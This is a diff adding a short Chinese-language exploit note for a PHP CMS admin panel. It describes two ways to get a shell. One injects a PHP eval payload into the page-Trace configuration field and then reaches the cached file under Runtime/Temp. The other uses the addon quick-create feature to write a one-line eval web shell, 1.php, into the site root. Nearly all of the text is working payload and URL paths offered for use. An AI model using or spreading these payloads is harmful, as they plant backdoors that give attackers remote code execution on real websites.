@@ -1,0 +1,14 @@
+/admin.php?s=/Config/group/id/4.html
+是否显示页面Trace
+?><?php @eval($_POST[1]);echo 1;//{
+
+http://x.com/Runtime/Temp/6a658a89308acd6a88f324a7815b2777.php
+
+-----------------------------------------------
+
+http://x.com/admin.php?s=/Addons/create.html
+插件快速创建 勾选是否需要配置 直接写
+file_put_contents("1.php",'<?php @eval($_REQUEST[1]);?>');
+根目录生成1.php
+
+------------------------------------------------
